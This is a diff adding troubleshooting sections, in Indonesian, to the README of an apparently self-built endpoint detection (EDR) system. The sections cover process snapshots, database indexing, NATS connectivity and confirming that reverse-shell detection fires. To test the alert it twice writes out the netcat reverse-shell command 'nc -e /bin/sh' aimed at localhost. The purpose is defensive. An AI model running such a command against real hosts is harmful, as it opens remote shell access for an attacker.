@@ -107,6 +107,57 @@ Lalu cek **Threat Alerts** di UI — harus muncul "Netcat Reverse Shell (nc -e)"
 
 Dengan `config.production.yaml` (atau `output.file.enabled` / `output.nats.enabled`), event stream ke stderr otomatis dimatikan. Jika masih berisik, pastikan `output.stderr: false` di config.
 
+## Process tree: snapshot periodik (bukan per-execve)
+
+Process tree sekarang pakai **snapshot periodik** (seperti `ps aux`) setiap 60 detik — tidak simpan tiap execve. Hemat storage.
+
+Config: `monitor.process_snapshot_interval: 60` (detik). Event execve tetap dikirim untuk **detection** (Sigma rules), tapi tidak disimpan ke process_tree.
+
+## Process tree lemot
+
+Sudah dioptimasi: API limit 300 proses, index DB, UI incremental load (80 grid / 120 hex awal, tombol "Show more").
+
+**DB existing** (sebelum migration): jalankan index untuk percepat query:
+```bash
+docker exec -i deploy-postgres-1 psql -U edr -d edr -c "CREATE INDEX IF NOT EXISTS idx_process_tree_host_live ON process_tree(host_id, start_ts) WHERE exit_ts IS NULL;"
+```
+(Ganti `deploy-postgres-1` dengan nama container postgres Anda.)
+
+## Troubleshooting: Test inject OK, tapi nc -e tidak terdetek
+
+Jika `go run scripts/inject_test_event.go` menghasilkan alert, tapi `nc -e /bin/sh 127.0.0.1 4444` tidak:
+
+1. **Agent harus jalan** di host yang sama:
+   ```bash
+   sudo ./edr-client -config config.production.yaml
+   ```
+   Harus ada log: `NATS output: events.default (tenant=default)`. Jika ada "NATS output disabled", cek NATS URL.
+
+2. **Cek ingest terima execve** saat nc dijalankan:
+   ```bash
+   # Terminal 1: agent
+   sudo ./edr-client -config config.production.yaml
+
+   # Terminal 2: nc
+   nc -e /bin/sh 127.0.0.1 4444
+
+   # Terminal 3: log ingest
+   docker compose -f deploy/docker-compose.yml logs ingest --tail 30
+   ```
+   Harus muncul `ingest: JIMBE execve pid=...`. Jika tidak ada → agent tidak mengirim ke NATS.
+
+3. **NATS URL**: Agent di host = `nats://127.0.0.1:4222`. Pastikan Docker expose port 4222.
+
+## Troubleshooting: lookup nats ... no such host
+
+Jika detection/ingest/normalize gagal konek ke NATS (`no such host`), pastikan **seluruh stack** jalan:
+
+```bash
+cd deploy && docker compose -f docker-compose.yml up -d
+```
+
+Jangan start container satu per satu — NATS harus jalan dulu (detection punya `depends_on: nats`).
+
 ## Troubleshooting: Agent tidak muncul di UI
 
 1. **Cek Docker stack jalan**: `docker compose -f docker-compose.yml ps` — semua service harus `Up`
